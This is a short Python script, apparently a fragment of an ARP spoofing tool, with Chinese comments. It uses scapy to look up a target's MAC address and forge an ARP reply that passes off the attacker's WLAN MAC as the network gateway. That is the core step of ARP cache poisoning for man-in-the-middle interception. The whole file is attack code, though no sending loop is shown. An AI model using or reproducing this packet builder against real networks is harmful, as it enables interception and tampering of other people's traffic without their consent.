import wmi
from scapy.all import (
    ARP,
    Ether,
    sendp,
    getmacbyip,
    get_if_hwaddr
)
import signal
import sys

def build_packet(TargetIp, GateWayAddr):
    print("[-] Obtaining mac from {}".format(TargetIp))  # 打印信息
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)  # 获得ipd的mac地址
    MyMacAddr = get_if_hwaddr("WLAN")  # 获得我们网卡的mac地址
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr,
                                                        pdst=TargetIp)
    pkt.show()
    print(pkt)
    return pkt

def stop(signal, frame):
    sys.exit(0)
